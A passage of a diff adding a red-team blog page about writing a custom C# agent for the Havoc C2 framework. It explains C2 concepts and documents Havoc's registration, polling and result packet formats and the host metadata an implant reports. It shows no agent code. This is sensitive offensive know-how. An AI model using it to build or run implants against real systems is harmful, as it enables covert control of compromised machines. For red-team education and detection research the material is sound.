@@ -1,0 +1,985 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Iron Hulk – Custom Havoc C2 Agent</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
+  <style>
+    #backLink { position: absolute; top: 50%; right: 2rem; transform: translateY(-50%); }
+    @media (max-width: 768px) {
+      #backLink {
+        position: static !important;
+        transform: none !important;
+        text-align: left;
+        margin-bottom: .5rem;
+      }
+    }
+  </style>
+</head>
+<body class="bg-[#0f172a] text-white min-h-screen" style="font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;">
+
+  <header style="position:relative; background:linear-gradient(135deg,#0b1220 0%,#1e293b 100%); color:#f8fafc; padding:2rem; border-bottom:5px solid #5eead4;">
+    <div id="backLink">
+      <a href="../projects.html" style="color:#5eead4; font-size:14px; text-decoration:none; font-weight:500;">
+        ← Back to Projects
+      </a>
+    </div>
+    <div style="text-align:center;">
+      <h1 style="font-size:2.8rem; margin:0 0 1rem;" class="font-bold mb-2">
+        Custom Havoc C2 Agent
+      </h1>
+      <p style="font-size:1.5rem; font-weight:600; max-width:800px; margin:0 auto;">
+        Protocol Internals, Registration Handshakes, and a Version 1 Agent Built for Red Teamers to Extend
+      </p>
+      <div id="metaRow" style="display:flex; justify-content:center; gap:20px; margin-top:1.5rem; font-size:.9rem; color:rgba(248,250,252,.78);">
+        <span>Written by: Iron Hulk</span>
+        <span>Published: September 3, 2026</span>
+        <span id="reading-time" style="color:rgba(248,250,252,.78);"></span>
+        <span>
+          <a href="https://twitter.com/IronHulk_0xff" target="_blank" rel="noopener noreferrer"
+            style="color:#f8fafc; text-decoration:none; display:inline-flex; align-items:center; gap:5px;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="#5eead4" aria-hidden="true">
+              <path d="M22.46 6c-.77.35-1.6.58-2.46.69a4.27 4.27 0 001.88-2.35 8.48 8.48 0 01-2.7 1.04 4.23 4.23 0 00-7.24 3.86A12 12 0 013 4.79a4.23 4.23 0 001.31 5.64 4.18 4.18 0 01-1.91-.53v.05a4.23 4.23 0 003.39 4.14 4.3 4.3 0 01-1.9.07 4.24 4.24 0 003.95 2.93A8.5 8.5 0 012 19.54a12 12 0 006.29 1.84c7.55 0 11.68-6.26 11.68-11.68 0-.18 0-.36-.01-.54A8.35 8.35 0 0022.46 6z"/>
+            </svg>
+            <span>Iron Hulk</span>
+          </a>
+        </span>
+      </div>
+    </div>
+  </header>
+
+  <main id="article" class="p-6 sm:text-justify">
+
+    <!-- ══ BISMILLAH + INTRO ══════════════════════════════════════════ -->
+    <div class="rounded-2xl bg-[#04151f] p-10 shadow-xl ring-1 ring-teal-400/25">
+      <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&display=swap" rel="stylesheet">
+      <div class="col-span-2 flex items-center justify-center gap-6">
+        <div class="h-[1px] flex-1 min-w-0 bg-gradient-to-r from-transparent via-teal-500/40 to-transparent py-3"></div>
+        <h1 dir="rtl" class="text-4xl md:text-5xl text-center tracking-wide py-4 min-w-0 shrink bg-clip-text text-transparent bg-gradient-to-r from-teal-400 via-teal-400 to-teal-500" style="font-family:'Amiri', serif;">
+          بسم الله الرحمن الرحيم
+        </h1>
+        <div class="h-[1px] flex-1 min-w-0 bg-gradient-to-r from-transparent via-teal-500/40 to-transparent py-3"></div>
+      </div>
+      <br>
+
+      <!-- Version Notice -->
+      <div class="rounded-xl bg-amber-900/20 p-5 ring-1 ring-amber-500/30 flex gap-4 items-start mb-8">
+        <div class="flex h-9 w-9 shrink-0 items-center justify-center rounded-lg border border-amber-400/40 bg-amber-500/15 text-amber-300 font-bold text-xs">v1</div>
+        <div>
+          <p class="text-amber-300 font-semibold text-sm">This is Version 1: Intentional Gaps Remain</p>
+          <p class="text-slate-300 text-sm mt-1 leading-relaxed">
+            This project is a deliberate first iteration. Several capability gaps exist across OPSEC hardening, evasion, and protocol coverage. Rather than shipping a fully polished implant,
+            I chose to leave those gaps open so that red teamers who use this as a foundation can research, implement, and deeply understand each piece themselves.
+            A complete implant that you cannot explain is operationally dangerous. The gaps section at the end of this page maps every known missing capability in detail.
+            The agent runs over plain HTTP by design. That is intentional for this version, it lets you inspect every byte of the exchange in a proxy or packet capture and follow the full workflow without TLS getting in the way. For any real deployment, switch <code class="text-amber-300 text-xs">HTTPS = true</code>. Note that the code disables certificate validation to support self-signed C2 certs, TLS will encrypt the channel but will not authenticate the server. For production use, replace the blanket accept callback with certificate pinning. Upgrading to HTTPS with proper cert validation is one of the recommended first improvements alongside the other gaps listed below.
+          </p>
+          <p class="text-slate-400 text-sm mt-3 leading-relaxed">
+            A sincere thank you to the colleagues and teammates who supported this project, for the conversations, the feedback, and the encouragement along the way.
+          </p>
+        </div>
+      </div>
+
+      <section class="space-y-8 text-slate-200">
+        <header>
+          <h2 class="font-mono text-3xl md:text-4xl font-semibold tracking-tight leading-tight text-slate-100">Table of Contents</h2>
+          <br>
+          <ol class="space-y-2 text-sm text-gray-300">
+            <li class="flex gap-3 items-center"><span class="text-teal-400 font-mono font-bold w-6">01</span><a href="#c2" class="hover:text-teal-300 underline underline-offset-4">What is Command and Control</a></li>
+            <li class="flex gap-3 items-center"><span class="text-teal-400 font-mono font-bold w-6">02</span><a href="#havoc" class="hover:text-teal-300 underline underline-offset-4">What is Havoc</a></li>
+            <li class="flex gap-3 items-center"><span class="text-teal-400 font-mono font-bold w-6">03</span><a href="#callback" class="hover:text-teal-300 underline underline-offset-4">How Demon Calls Back to the Teamserver</a></li>
+            <li class="flex gap-3 items-center"><span class="text-teal-400 font-mono font-bold w-6">04</span><a href="#metadata" class="hover:text-teal-300 underline underline-offset-4">What Metadata the Agent Collects and Reports</a></li>
+            <li class="flex gap-3 items-center"><span class="text-teal-400 font-mono font-bold w-6">05</span><a href="#customdll" class="hover:text-teal-300 underline underline-offset-4">How to Write a Custom Agent DLL</a></li>
+            <li class="flex gap-3 items-center"><span class="text-teal-400 font-mono font-bold w-6">06</span><a href="#howworks" class="hover:text-teal-300 underline underline-offset-4">How the Custom Agent Works with Havoc</a></li>
+            <li class="flex gap-3 items-center"><span class="text-teal-400 font-mono font-bold w-6">07</span><a href="#walkthrough" class="hover:text-teal-300 underline underline-offset-4">Code Walk-Through: Block by Block</a></li>
+            <li class="flex gap-3 items-center"><span class="text-teal-400 font-mono font-bold w-6">08</span><a href="#gaps" class="hover:text-teal-300 underline underline-offset-4">Known Gaps and What to Build Next</a></li>
+          </ol>
+        </header>
+      </section>
+    </div>
+    <br>
+
+    <!-- ══ 01 WHAT IS C2 ══════════════════════════════════════════════ -->
+    <div id="c2" class="rounded-2xl bg-[#04151f] p-10 shadow-xl ring-1 ring-teal-400/25">
+      <div class="relative grid grid-cols-1 gap-10">
+        <section class="space-y-6 text-slate-200">
+          <h2 class="font-mono text-3xl md:text-4xl font-semibold tracking-tight leading-tight text-slate-100">1: What is Command and Control?</h2>
+
+          <p class="leading-relaxed">
+            Post-exploitation without a C2 channel is a dead end. You land on the box, run your payload, and then you have nothing, no persistence, no tasking, no way to receive output. The C2 framework is what turns a one-shot payload into a session you can operate, issue commands, collect results, pivot, and re-task without touching the disk again.
+          </p>
+
+          <p class="leading-relaxed">
+            The setup is the same across every framework. A <strong class="text-teal-300">teamserver</strong> sits on infrastructure you control, it stores session state, queues operator tasks, and decrypts inbound traffic. An <strong class="text-teal-300">operator client</strong> (GUI or CLI) is how you drive it. The <strong class="text-teal-300">agent</strong> running on the target polls the server, pulls down whatever is queued, executes it, and ships the output back. The target machine initiates every connection, the server never needs inbound access, so you punch through NAT and corporate firewalls without changing a single firewall rule.
+          </p>
+
+          <div class="grid gap-6 sm:grid-cols-2">
+            <article class="rounded-xl bg-slate-800/40 p-6 ring-1 ring-slate-700/40">
+              <h3 class="text-xl font-semibold text-teal-300">Why Not a Simple Reverse Shell?</h3>
+              <p class="mt-3 text-slate-300 leading-relaxed text-sm">
+              A basic reverse shell typically connects the target’s command interpreter to a listener over a long-lived TCP connection. Minimal implementations often lack encryption, automatic reconnection, centralized task history, and multi-operator support, and usually lose the interactive session when the connection drops. Many C2 frameworks add encrypted communication, periodic check-ins, reconnection logic, centralized tasking and logging, and operator     collaboration. Supported transports, encryption schemes, and recovery behavior vary by framework and configuration. 
+              </p>
+            </article>
+            <article class="rounded-xl bg-slate-800/40 p-6 ring-1 ring-slate-700/40">
+              <h3 class="text-xl font-semibold text-teal-300">Which Protocols Carry C2 Traffic?</h3>
+              <p class="mt-3 text-slate-300 leading-relaxed text-sm">
+                HTTP and HTTPS dominate because they look identical to normal browser activity on the wire and because firewalls almost never block outbound port 443. Operators also use DNS tunneling for highly restricted environments, SMB named pipes for lateral movement within networks that have no direct internet egress, and increasingly, legitimate cloud APIs such as Slack, Notion, and Microsoft Graph as covert channels. The core idea does not change: an agent polls for work, executes it, and returns output over whatever channel is least likely to trigger an alert.
+              </p>
+            </article>
+          </div>
+
+          <blockquote class="border-l-4 border-teal-400 pl-4 text-slate-400 italic text-sm">
+            A C2 framework does not make exploitation easier. It makes post-exploitation persistent, coordinated, and operationally manageable at scale.
+          </blockquote>
+        </section>
+      </div>
+    </div>
+    <br>
+
+    <!-- ══ 02 WHAT IS HAVOC ════════════════════════════════════════════ -->
+    <div id="havoc" class="rounded-2xl bg-[#04151f] p-10 shadow-xl ring-1 ring-teal-400/25">
+      <div class="relative grid grid-cols-1 gap-10">
+        <section class="space-y-6 text-slate-200">
+          <h2 class="font-mono text-3xl md:text-4xl font-semibold tracking-tight leading-tight text-slate-100">2: What is Havoc</h2>
+
+          <p class="leading-relaxed">
+            Havoc was built by C5pider and released publicly in 2022. It is free, open source, and ships everything a real engagement needs. A Go teamserver, a Qt operator client, and a native Windows agent called Demon written in C with x64 assembly. The entire codebase is auditable, you can read exactly what the server does with your traffic, trace the encryption path, and understand the wire protocol well enough to re-implement it in another language. That auditability is what makes it genuinely useful for both offensive operators and defensive researchers.
+          </p>
+
+          <div class="grid gap-6 sm:grid-cols-3">
+            <article class="rounded-xl bg-slate-800/40 p-6 ring-1 ring-slate-700/40">
+              <h3 class="text-xl font-semibold text-teal-300">Teamserver</h3>
+              <p class="mt-3 text-slate-300 leading-relaxed text-sm">Written in Go using the Gin web framework and Gorilla WebSocket. Stores session data in SQLite, authenticates operators via a YAOTL profile file, brokers all traffic between operators and agents on a configurable port.</p>
+            </article>
+            <article class="rounded-xl bg-slate-800/40 p-6 ring-1 ring-slate-700/40">
+              <h3 class="text-xl font-semibold text-teal-300">Operator Client</h3>
+              <p class="mt-3 text-slate-300 leading-relaxed text-sm">Built in C++ with Qt. Provides a session table, an interactive console per agent, a visual session graph, and a Python script manager. Multiple operators connect simultaneously, share the session view in real time and many other features.</p>
+            </article>
+            <article class="rounded-xl bg-slate-800/40 p-6 ring-1 ring-slate-700/40">
+              <h3 class="text-xl font-semibold text-teal-300">Demon Agent</h3>
+              <p class="mt-3 text-slate-300 leading-relaxed text-sm">Written in C with x64 assembly. Compiles on-demand via MinGW. Supports sleep obfuscation, indirect syscalls, return address spoofing, token impersonation, process injection, and COFF/BOF execution, all generated with embedded configuration at payload request time.</p>
+            </article>
+          </div>
+
+          <h3 class="text-xl font-semibold text-teal-300">How Havoc Generates a Demon Payload</h3>
+
+          <p class="leading-relaxed">
+            When an operator requests a Demon payload from the client, the teamserver compiles the Demon C source through MinGW on the server host and delivers the binary. The listener address, port, sleep interval, jitter, kill date, injection method, and evasion flags are all embedded at compile time, there is no runtime config file on the target. The operator picks an output format (shellcode, DLL, or EXE), the teamserver builds it on demand, and the binary is ready to deploy. That on-demand compilation is what the "Compiles on-demand via MinGW" line in the Demon card refers to.
+          </p>
+
+          <p class="leading-relaxed">
+            The custom agent in this project skips that entire process. It is a standalone C# code with its C2 address and options hardcoded as constants, compiled once by the developer. You drop it on the target and it calls back to the same teamserver using the same wire protocol Demon uses. From the server's perspective there is no difference, it sees the correct magic value, accepts the registration, and shows a new session row in the operator client. No teamserver modification, no payload profile, no MinGW.
+          </p>
+
+          <h3 class="text-xl font-semibold text-teal-300">How Havoc Compares to Other Frameworks</h3>
+
+          <div class="rounded-2xl border border-emerald-500/30 bg-gray-950 shadow-xl">
+            <div class="border-b border-emerald-500/20 bg-gradient-to-r from-emerald-600/20 to-teal-600/10 p-5">
+              <h3 class="text-xl font-semibold text-emerald-200">Framework Comparison</h3>
+            </div>
+            <div class="overflow-x-auto">
+              <table class="min-w-full text-sm">
+                <thead>
+                  <tr class="bg-gray-900/60 text-gray-400 text-xs uppercase tracking-wider">
+                    <th class="px-4 py-3 text-left">Framework</th>
+                    <th class="px-4 py-3 text-left">Language</th>
+                    <th class="px-4 py-3 text-left">Cost</th>
+                    <th class="px-4 py-3 text-left">Agent</th>
+                    <th class="px-4 py-3 text-left">Custom Agent</th>
+                  </tr>
+                </thead>
+                <tbody class="divide-y divide-emerald-700/20 text-slate-200">
+                  <tr class="hover:bg-emerald-700/10"><td class="px-4 py-3 font-semibold text-teal-300">Havoc</td><td class="px-4 py-3">Go / C++ / C</td><td class="px-4 py-3 text-emerald-300">Free, open source</td><td class="px-4 py-3">Demon (C/ASM)</td><td class="px-4 py-3 text-amber-300">Source only, no spec</td></tr>
+                  <tr class="hover:bg-emerald-700/10"><td class="px-4 py-3 font-semibold text-teal-300">Cobalt Strike</td><td class="px-4 py-3">Java</td><td class="px-4 py-3 text-red-300">~$5,000 / operator / year</td><td class="px-4 py-3">Beacon (C)</td><td class="px-4 py-3 text-emerald-300">Yes, ExternalC2</td></tr>
+                  <tr class="hover:bg-emerald-700/10"><td class="px-4 py-3 font-semibold text-teal-300">Sliver</td><td class="px-4 py-3">Go</td><td class="px-4 py-3 text-emerald-300">Free, open source</td><td class="px-4 py-3">Go implant</td><td class="px-4 py-3 text-amber-300">Limited</td></tr>
+                  <tr class="hover:bg-emerald-700/10"><td class="px-4 py-3 font-semibold text-teal-300">Brute Ratel</td><td class="px-4 py-3">C++</td><td class="px-4 py-3 text-red-300">~$2,500 / operator / year</td><td class="px-4 py-3">Badger (C++)</td><td class="px-4 py-3 text-red-300">No</td></tr>
+                  <tr class="hover:bg-emerald-700/10"><td class="px-4 py-3 font-semibold text-teal-300">Metasploit</td><td class="px-4 py-3">Ruby</td><td class="px-4 py-3 text-emerald-300">Free (community)</td><td class="px-4 py-3">Meterpreter (C)</td><td class="px-4 py-3 text-amber-300">Difficult</td></tr>
+                </tbody>
+              </table>
+            </div>
+          </div>
+
+          <p class="leading-relaxed">
+            What makes Havoc useful for this project is that the wire protocol is consistent and derivable from the source. There is no official protocol specification and going through the official Havoc repository at github.com/HavocFramework/Havoc and analysing the teamserver Go source directly is how every detail in this blog was established. Any agent that sends the right bytes shows up as a fully functional session, the server does not care what language produced the binary, what evasion technique it uses, or how it manages memory. Write the agent in C#, Rust, or Python, apply whatever evasion strategy fits your target environment, and the full Havoc operator tooling works without touching a single line of server code.
+          </p>
+        </section>
+      </div>
+    </div>
+    <br>
+
+    <!-- ══ 03 HOW DEMON CALLS BACK ═════════════════════════════════════ -->
+    <div id="callback" class="rounded-2xl bg-[#04151f] p-10 shadow-xl ring-1 ring-teal-400/25">
+      <div class="relative grid grid-cols-1 gap-10">
+        <section class="space-y-6 text-slate-200">
+          <h2 class="font-mono text-3xl md:text-4xl font-semibold tracking-tight leading-tight text-slate-100">3: How Demon Calls Back to the Teamserver</h2>
+
+          <p class="leading-relaxed">
+            Before the agent can receive any commands it has to register. This one-time handshake transmits the session encryption key, proves the agent's identity, and delivers all the metadata the operator sees in the session table. The polling loop does not start until the server confirms it.
+          </p>
+
+          <h3 class="text-xl font-semibold text-teal-300">Step 1: The Registration Packet</h3>
+          <p class="leading-relaxed">
+            Registration is an HTTP POST. The packet layout below was established by reading the HTTP handler and agent registration code in the official Havoc repository, there is no published specification. The packet opens with a 20-byte fixed header the server uses to identify and route traffic, followed by the AES-256 key and IV sent in plaintext, and then the metadata blob encrypted with those same keys.
+          </p>
+
+          <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-indigo-500/20 max-w-full overflow-x-auto">
+            <p class="text-indigo-300 font-semibold text-xs uppercase tracking-wider mb-3">Registration Packet Layout: Agent to Teamserver</p>
+            <div class="space-y-2 font-mono text-sm text-slate-200">
+              <div class="flex gap-4"><span class="text-teal-400 w-44 shrink-0">SIZE (4 bytes BE)</span><span class="text-slate-300">Total byte count of everything after this field</span></div>
+              <div class="flex gap-4"><span class="text-teal-400 w-44 shrink-0">MAGIC (4 bytes BE)</span><span class="text-slate-300">Fixed identifier: <span class="text-amber-300">0xDEADBEEF</span> for the stock teamserver. The agent must use the same value as the teamserver binary it connects to, or registration is silently dropped.</span></div>
+              <div class="flex gap-4"><span class="text-teal-400 w-44 shrink-0">AGENT_ID (4 bytes BE)</span><span class="text-slate-300">Random 32-bit session identifier generated on startup</span></div>
+              <div class="flex gap-4"><span class="text-teal-400 w-44 shrink-0">CMD_INIT (4 bytes BE)</span><span class="text-slate-300">Fixed value <span class="text-amber-300">99</span>, signals this is a registration packet, not a task result</span></div>
+              <div class="flex gap-4"><span class="text-teal-400 w-44 shrink-0">ZERO (4 bytes BE)</span><span class="text-slate-300">Padding field and always 0</span></div>
+              <div class="flex gap-4"><span class="text-emerald-400 w-44 shrink-0">AES_KEY (32 bytes)</span><span class="text-slate-300">Session encryption key: written raw into the packet, no wrapping. The server needs it in plaintext to decrypt the body that follows. The agent ships with <code class="text-amber-300 text-xs">HTTPS = false</code>, so on plain HTTP this key travels in cleartext and any observer on the network can read it directly. Setting <code class="text-amber-300 text-xs">HTTPS = true</code> wraps the entire request in TLS, which hides the key from passive interception.</span></div>
+              <div class="flex gap-4"><span class="text-emerald-400 w-44 shrink-0">AES_IV (16 bytes)</span><span class="text-slate-300">Session IV: same situation, it's in cleartext on HTTP, encrypted on HTTPS. Fixed for the lifetime of the session; every packet reuses it, which is the keystream reuse weakness covered in the gaps section.</span></div>
+              <div class="flex gap-4"><span class="text-indigo-400 w-44 shrink-0">ENCRYPTED_BODY</span><span class="text-slate-300">All session metadata, AES-256-CTR encrypted with the key and IV above</span></div>
+            </div>
+          </div>
+
+          <div class="rounded-xl bg-amber-900/20 p-4 ring-1 ring-amber-500/30 text-sm text-amber-200">
+            <strong>Important:</strong> The AES key and IV travel in the same HTTP request as the encrypted registration body. Any passive observer on the network can read them directly off the wire and decrypt everything that follows. Run the listener on HTTPS in any real deployment.
+          </div>
+
+          <h3 class="text-xl font-semibold text-teal-300">Step 2: The Teamserver Acknowledges</h3>
+          <p class="leading-relaxed">
+            The server decrypts the registration body, extracts the metadata fields, stores the session in SQLite, and fires a WebSocket event to every connected operator client and the new row appears instantly. The HTTP response is just the agent ID encrypted with the session key. The agent decrypts it, confirms the ID matches what was sent, and moves on.
+          </p>
+
+          <h3 class="text-xl font-semibold text-teal-300">Step 3: The Polling Loop</h3>
+          <p class="leading-relaxed">
+            After registration the agent enters its polling loop. Every cycle it POSTs a minimal 20-byte check-in packet, the server dequeues any pending tasks and packs them into the response, and the agent dispatches them. Nothing queued means a CMD_NOJOB(10) and the agent goes back to sleep. The server never initiates contact, the agent always pulls, which means no inbound firewall rules are needed on your infrastructure.
+          </p>
+
+          <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-indigo-500/20 max-w-full overflow-x-auto">
+            <p class="text-indigo-300 font-semibold text-xs uppercase tracking-wider mb-3">Task Response Packet: Teamserver to Agent</p>
+            <div class="space-y-2 font-mono text-sm text-slate-200">
+              <p class="text-gray-500 text-xs">No count prefix: the agent reads tasks until the response bytes are exhausted:</p>
+              <div class="flex gap-4"><span class="text-emerald-400 w-44 shrink-0">CMD (4 bytes LE)</span><span class="text-slate-300">Command identifier, e.g. 15 for filesystem operations</span></div>
+              <div class="flex gap-4"><span class="text-emerald-400 w-44 shrink-0">REQ_ID (4 bytes LE)</span><span class="text-slate-300">Unique request ID used to correlate the output</span></div>
+              <div class="flex gap-4"><span class="text-emerald-400 w-44 shrink-0">LENGTH (4 bytes LE)</span><span class="text-slate-300">Byte count of the AES-encrypted data that follows</span></div>
+              <div class="flex gap-4"><span class="text-indigo-400 w-44 shrink-0">AES(data)</span><span class="text-slate-300">Task payload encrypted with the session key and <strong class="text-amber-300">fixed session IV</strong>, no per-task nonce in the stock binary</span></div>
+            </div>
+          </div>
+          <div class="rounded-xl bg-amber-900/20 p-4 ring-1 ring-amber-500/30 text-sm text-amber-200 mt-2">
+            <strong>Stock teamserver encryption:</strong> The stock Havoc teamserver binary encrypts every task with <code class="text-amber-300 text-xs">AES-CTR(DataPayload, sessionKey, sessionIV)</code> where <code class="text-amber-300 text-xs">sessionIV</code> is the fixed 16-byte IV sent during registration, no per-task nonce. The agent decrypts each task as <code class="text-amber-300 text-xs">AesCtr(enc, _key, _iv)</code>. If you are running a modified teamserver binary that prepends a per-task nonce, the agent will need to strip it before decrypting, mismatching this produces garbage that looks identical to a wrong AES key.
+          </div>
+
+          <h3 class="text-xl font-semibold text-teal-300">Step 4: Sending Results Back</h3>
+          <p class="leading-relaxed">
+            When a task finishes the agent POSTs a result packet back. CMD and REQ_ID sit unencrypted in the header so the server can route and correlate the packet before touching the AES layer, useful when many agents are beaconing at once. Inside the encrypted payload, command output uses DEMON_OUTPUT's two-level length prefix: an outer length covering the inner prefix plus the data, and an inner length covering just the raw bytes.
+          </p>
+
+          <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-indigo-500/20 max-w-full overflow-x-auto">
+            <p class="text-indigo-300 font-semibold text-xs uppercase tracking-wider mb-3">Result Packet Layout — Agent to Teamserver</p>
+            <div class="space-y-2 font-mono text-sm text-slate-200">
+              <div class="flex gap-4"><span class="text-teal-400 w-44 shrink-0">SIZE (4 bytes BE)</span><span class="text-slate-300">Byte count of everything after this field</span></div>
+              <div class="flex gap-4"><span class="text-teal-400 w-44 shrink-0">MAGIC (4 bytes BE)</span><span class="text-slate-300">Same magic value as registration</span></div>
+              <div class="flex gap-4"><span class="text-teal-400 w-44 shrink-0">AGENT_ID (4 bytes BE)</span><span class="text-slate-300">This agent's session identifier</span></div>
+              <div class="flex gap-4"><span class="text-amber-400 w-44 shrink-0">CMD (4 bytes BE)</span><span class="text-slate-300"><strong>Plaintext</strong> — command ID (e.g. 90 for output, 15 for FS)</span></div>
+              <div class="flex gap-4"><span class="text-amber-400 w-44 shrink-0">REQ_ID (4 bytes BE)</span><span class="text-slate-300"><strong>Plaintext</strong> — correlates output to the originating task</span></div>
+              <div class="flex gap-4"><span class="text-indigo-400 w-44 shrink-0">AES(payload)</span><span class="text-slate-300">Encrypted: [OUTER_LEN 4BE][INNER_LEN 4BE][output bytes]</span></div>
+            </div>
+          </div>
+        </section>
+      </div>
+    </div>
+    <br>
+
+    <!-- ══ 04 METADATA ════════════════════════════════════════════════ -->
+    <div id="metadata" class="rounded-2xl bg-[#04151f] p-10 shadow-xl ring-1 ring-teal-400/25">
+      <div class="relative grid grid-cols-1 gap-10">
+        <section class="space-y-6 text-slate-200">
+          <h2 class="font-mono text-3xl md:text-4xl font-semibold tracking-tight leading-tight text-slate-100">4: What Metadata the Agent Collects and Reports</h2>
+
+          <p class="leading-relaxed">
+            The encrypted registration body carries a fixed sequence of fields the server extracts and stores in SQLite. All field names, types, and ordering in the table below were confirmed by reading the agent registration handler in the Havoc teamserver source, the Havoc website and GitHub carry no metadata specification. These are what populate the session table columns on first callback. The parser reads them in exact order, no field names, no separators, just byte counts. One field out of sequence silently corrupts every field that follows it.
+          </p>
+
+          <div class="rounded-2xl border border-emerald-500/30 bg-gray-950 shadow-xl">
+            <div class="border-b border-emerald-500/20 bg-gradient-to-r from-emerald-600/20 to-teal-600/10 p-5">
+              <h3 class="text-xl font-semibold text-emerald-200">Registration Metadata Fields</h3>
+            </div>
+            <div class="overflow-x-auto">
+              <table class="min-w-full text-sm">
+                <thead>
+                  <tr class="bg-gray-900/60 text-gray-400 text-xs uppercase tracking-wider">
+                    <th class="px-4 py-3 text-left">Field</th>
+                    <th class="px-4 py-3 text-left">Type</th>
+                    <th class="px-4 py-3 text-left">How It Is Collected</th>
+                    <th class="px-4 py-3 text-left">Client Column</th>
+                  </tr>
+                </thead>
+                <tbody class="divide-y divide-emerald-700/20 text-slate-200">
+                  <tr class="hover:bg-emerald-700/10"><td class="px-4 py-3 font-semibold text-teal-300">Hostname</td><td class="px-4 py-3 font-mono text-xs text-slate-400">ASCII, BE length prefix</td><td class="px-4 py-3"><code class="text-amber-300 text-xs">Dns.GetHostName()</code></td><td class="px-4 py-3">Computer</td></tr>
+                  <tr class="hover:bg-emerald-700/10"><td class="px-4 py-3 font-semibold text-teal-300">Username</td><td class="px-4 py-3 font-mono text-xs text-slate-400">ASCII, BE length prefix</td><td class="px-4 py-3"><code class="text-amber-300 text-xs">Environment.UserName</code></td><td class="px-4 py-3">User</td></tr>
+                  <tr class="hover:bg-emerald-700/10"><td class="px-4 py-3 font-semibold text-teal-300">Domain</td><td class="px-4 py-3 font-mono text-xs text-slate-400">ASCII, BE length prefix</td><td class="px-4 py-3"><code class="text-amber-300 text-xs">Environment.UserDomainName</code></td><td class="px-4 py-3">Domain</td></tr>
+                  <tr class="hover:bg-emerald-700/10"><td class="px-4 py-3 font-semibold text-teal-300">Internal IP</td><td class="px-4 py-3 font-mono text-xs text-slate-400">ASCII, BE length prefix</td><td class="px-4 py-3"><code class="text-amber-300 text-xs">NetworkInterface.GetAllNetworkInterfaces()</code></td><td class="px-4 py-3">IP</td></tr>
+                  <tr class="hover:bg-emerald-700/10"><td class="px-4 py-3 font-semibold text-teal-300">Process path</td><td class="px-4 py-3 font-mono text-xs text-slate-400">UTF-16 LE, BE length prefix</td><td class="px-4 py-3"><code class="text-amber-300 text-xs">Process.GetCurrentProcess().MainModule.FileName</code></td><td class="px-4 py-3">Process</td></tr>
+                  <tr class="hover:bg-emerald-700/10"><td class="px-4 py-3 font-semibold text-teal-300">Process ID</td><td class="px-4 py-3 font-mono text-xs text-slate-400">4 bytes BE</td><td class="px-4 py-3"><code class="text-amber-300 text-xs">Process.GetCurrentProcess().Id</code></td><td class="px-4 py-3">PID</td></tr>
+                  <tr class="hover:bg-emerald-700/10"><td class="px-4 py-3 font-semibold text-teal-300">OS version</td><td class="px-4 py-3 font-mono text-xs text-slate-400">5 × 4 bytes BE</td><td class="px-4 py-3">Major, minor, and build read at runtime via <code class="text-amber-300 text-xs">Environment.OSVersion</code>; product type and service pack level are hardcoded (1 and 0)</td><td class="px-4 py-3">OS</td></tr>
+                  <tr class="hover:bg-emerald-700/10"><td class="px-4 py-3 font-semibold text-teal-300">Process architecture</td><td class="px-4 py-3 font-mono text-xs text-slate-400">4 bytes BE</td><td class="px-4 py-3">Runtime: <code class="text-amber-300 text-xs">IntPtr.Size == 8 ? 2 : 1</code> — 1 = x86, 2 = x64</td><td class="px-4 py-3">Arch tag</td></tr>
+                  <tr class="hover:bg-emerald-700/10"><td class="px-4 py-3 font-semibold text-teal-300">Processor architecture</td><td class="px-4 py-3 font-mono text-xs text-slate-400">4 bytes BE</td><td class="px-4 py-3">Hardcoded 9 (PROCESSOR_ARCHITECTURE_AMD64 / x64)</td><td class="px-4 py-3">—</td></tr>
+                  <tr class="hover:bg-emerald-700/10"><td class="px-4 py-3 font-semibold text-teal-300">Elevated flag</td><td class="px-4 py-3 font-mono text-xs text-slate-400">4 bytes BE</td><td class="px-4 py-3"><code class="text-amber-300 text-xs">WindowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator)</code></td><td class="px-4 py-3">Star icon</td></tr>
+                  <tr class="hover:bg-emerald-700/10"><td class="px-4 py-3 font-semibold text-teal-300">Sleep interval</td><td class="px-4 py-3 font-mono text-xs text-slate-400">4 bytes BE (seconds)</td><td class="px-4 py-3">From compiled-in constant, converted to seconds</td><td class="px-4 py-3">Sleep</td></tr>
+                  <tr class="hover:bg-emerald-700/10"><td class="px-4 py-3 font-semibold text-teal-300">Jitter percentage</td><td class="px-4 py-3 font-mono text-xs text-slate-400">4 bytes BE</td><td class="px-4 py-3">From compiled-in constant, as a whole percentage</td><td class="px-4 py-3">Jitter</td></tr>
+                </tbody>
+              </table>
+            </div>
+          </div>
+
+          <p class="leading-relaxed">
+            The only string encoding exception is the process path, which uses UTF-16 LE where everything else uses ASCII. Most integers and length prefixes are 4-byte big-endian; 64-bit fields such as the base address are 8-byte big-endian. Get one encoding wrong and the session row shows garbage text; get the order wrong and everything after the misplaced field is garbage.
+          </p>
+
+          <blockquote class="border-l-4 border-teal-400 pl-4 text-slate-400 italic text-sm">
+            The C# agent reads OS version fields at runtime using <code class="text-amber-300 text-xs not-italic">Environment.OSVersion</code>. Be aware that the underlying Win32 call (<code class="text-amber-300 text-xs not-italic">GetVersionEx</code>) lies on Windows 8.1 and later, returning 6.2 regardless of the real version unless an application manifest declares OS compatibility. A production agent should call <code class="text-amber-300 text-xs not-italic">RtlGetVersion</code> via P/Invoke, which always returns the real version numbers.
+          </blockquote>
+        </section>
+      </div>
+    </div>
+    <br>
+
+    <!-- ══ 05 HOW TO WRITE A CUSTOM DLL ═══════════════════════════════ -->
+    <div id="customdll" class="rounded-2xl bg-[#04151f] p-10 shadow-xl ring-1 ring-teal-400/25">
+      <div class="relative grid grid-cols-1 gap-10">
+        <section class="space-y-6 text-slate-200">
+          <h2 class="font-mono text-3xl md:text-4xl font-semibold tracking-tight leading-tight text-slate-100">5: How to Write a Custom Agent DLL</h2>
+
+          <p class="leading-relaxed">
